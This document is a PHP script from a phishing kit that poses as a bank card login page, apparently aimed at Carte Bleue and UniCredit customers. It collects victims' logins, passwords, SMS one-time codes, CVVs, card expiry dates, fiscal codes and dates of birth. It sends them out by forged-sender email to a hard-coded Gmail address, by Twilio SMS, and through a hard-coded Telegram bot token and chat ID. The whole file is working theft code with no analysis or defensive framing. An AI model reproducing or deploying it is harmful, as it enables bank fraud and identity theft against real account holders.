<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$hostname = gethostbyaddr($ip);
///////// Twilio Config
$emailtosend="zikoroot@gmail.com";
//////////////////
include("./phpmailer/class.phpmailer.php");
if(isset($_POST["usr"]) && strlen($_POST["usr"]) == 10 && isset($_POST["pass"])){
   $usr1 = $_POST['usr'];
   $pass1 = $_POST['pass'];
	$ip = visitorip();
	$useragent = $_SERVER["HTTP_USER_AGENT"];
	$message  = "~~~~[ E-Credit Bleue ]~~~~\n";
	$message .= "USR : $usr1\n";
	$message .= "PWD : $pass1\n";
	$message .= "~~~~[ By Rachdawa ]~~~~\n";
	$to="$emailtosend";
	$subj = "cartebleue $usr | $ip";
	$from = "From:E-Carte Bleue<info@aruba.com>";
	if(@mail($to, $subj, $message, $from) != false){
		$num="$numtosend";
		$msg="LOG : $usr - $pass ";
		$url="https://api.twilio.com/2010-04-01/Accounts/$sid/Messages.json";
		$agent            = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13";
		$ch = curl_init(); 
		$headers[] = "Accept: application/json";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_USERPWD, "$sid:$token");
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);         
		curl_setopt($ch, CURLOPT_USERAGENT, $agent);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		$fields = array(
			'To' => "+".$num,
			'From' => $sendernum,
			'Body' => $msg
			);
		$POSTFIELDS = http_build_query($fields); 
		curl_setopt($ch, CURLOPT_POST, true); 
		curl_setopt($ch, CURLOPT_POSTFIELDS, $POSTFIELDS); 
		curl_setopt($ch, CURLOPT_URL, $url);
		$result = curl_exec($ch);
		$json = json_decode($result,true);
	}else{
		echo "Failed to connect to to SMTP 127.0.0.1";
	}
}

if(isset($_POST["wajad"]) && $_POST["wajad"] == "rassek"){
	$num="$numtosend";
	$msg="UniC Wajad rassek  ".$_SESSION["login"];
	$url="https://api.twilio.com/2010-04-01/Accounts/$sid/Messages.json";
	$agent            = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13";
	$ch = curl_init(); 
	$headers[] = "Accept: application/json";
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_USERPWD, "$sid:$token");
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);         
	curl_setopt($ch, CURLOPT_USERAGENT, $agent);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	$fields = array(
		'To' => "+".$num,
		'From' => $sendernum,
		'Body' => $msg
		);
	$POSTFIELDS = http_build_query($fields); 
	curl_setopt($ch, CURLOPT_POST, true); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, $POSTFIELDS); 
	curl_setopt($ch, CURLOPT_URL, $url);
	$result = curl_exec($ch);
	$json = json_decode($result,true);
	if($json['status'] == "queued"){
		$res = "ok";
	}else{
		$res = "fail";
	}
	if($res == "fail"){
	$message = "#------ <CLICk>  ------#\n";
	$message .= "ip : $ip\n";
	$message .= "#------ <EXIT> ------#\n";
	$to = "$emailtosend"; // --> email
	$subj = "HELLO $ip";
	$from = "From: [UC]<noreply@aruba.com>";
	$go_inbox = @mail($to, $subj, $message, $from);
	if(!$go_inbox)
		echo "Your Host don't support MAIL() localhost 127.0.0.1";
	}
}else if (isset($_POST["sms"]) && strlen($_POST["sms"]) >= 6){
	$code=$_POST["sms"];
	$num="$numtosend";
	$msg="$code , LOG|$ip";
	$url="https://api.twilio.com/2010-04-01/Accounts/$sid/Messages.json";
	$agent            = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13";
	$ch = curl_init(); 
	$headers[] = "Accept: application/json";
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_USERPWD, "$sid:$token");
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);         
	curl_setopt($ch, CURLOPT_USERAGENT, $agent);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	$fields = array(
		'To' => "+".$num,
		'From' => $sendernum,
		'Body' => $msg
		);
	$POSTFIELDS = http_build_query($fields); 
	curl_setopt($ch, CURLOPT_POST, true); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, $POSTFIELDS); 
	curl_setopt($ch, CURLOPT_URL, $url);
	$result = curl_exec($ch);
	$json = json_decode($result,true);
	if($json['status'] == "queued"){
		$res = "ok";
		echo "<script type='text/javascript'>window.location = 'load.php?ip=$ip';</script>";
	}else{
		$res = "fail";
	}
	if($res == "fail"){
	$message .= "[UC]\n";
	$message .= "Password : $code\n";
	$message .= "[ENZO]\n";
	$to = "$emailtosend"; // --> email
	$subj = "PWD $ip";
	$from = "From: [UC]<noreply@aruba.com>";
	$go_inbox = @mail($to, $subj, $message, $from);
	if($go_inbox){
		echo "<script type='text/javascript'>window.location = 'load.php?ip=$ip';</script>";	
		}else{
			echo "Your Host don't support MAIL() localhost 127.0.0.1";
		}
	}
}else if(isset($_POST["cc4"]) && isset($_POST["expmonth"]) && isset($_POST["expyear"]) && isset($_POST["cvv"])){
	$num="$numtosend";
	$msg="Dernier 4 : ".$_POST["cc4"]."|".$_POST["expmonth"]."-".$_POST["expyear"]."|".$_POST["cvv"]." LOG@".$_SESSION["login"];
	$url="https://api.twilio.com/2010-04-01/Accounts/$sid/Messages.json";
	$agent            = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13";
	$ch = curl_init(); 
	$headers[] = "Accept: application/json";
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_USERPWD, "$sid:$token");
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);         
	curl_setopt($ch, CURLOPT_USERAGENT, $agent);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	$fields = array(
		'To' => "+".$num,
		'From' => $sendernum,
		'Body' => $msg
		);
	$POSTFIELDS = http_build_query($fields); 
	curl_setopt($ch, CURLOPT_POST, true); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, $POSTFIELDS); 
	curl_setopt($ch, CURLOPT_URL, $url);
	$result = curl_exec($ch);
	$json = json_decode($result,true);
	$message = "#------ <CC>  ------#\n";
	$message .= "Nome : ".$_POST["nm"]." ".$_POST["pn"]."\n";
	$message .= "Fiscal : ".$_POST["cf"]."\n";
	$message .= "DOB : ".$_POST["d1"]."/".$_POST["d2"]."/".$_POST["d3"]."\n";
	$message .= "Last 4 : ".$_POST["cc4"]."\n";
	$message .= "EXP : ".$_POST["expmonth"]."/".$_POST["expyear"]."\n";
	$message .= "CVV : ".$_POST["cvv"]."\n";
	$message .= "#------ <ENZO> ------#\n";
	$to = "$emailtosend"; // --> email
	$subj = "HELLO $ip";
	$from = "From: [UC]<noreply@aruba.com>";
	    $token = "819904934:AAEOe3KW_5TPgcNFlFLBO5tc67nDa42S78E";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=736694711&text=" . urlencode($message)."" );

	$go_inbox = @mail($to, $subj, $message, $from);
}else{
	echo "Nothing to see Here :)";
}
?>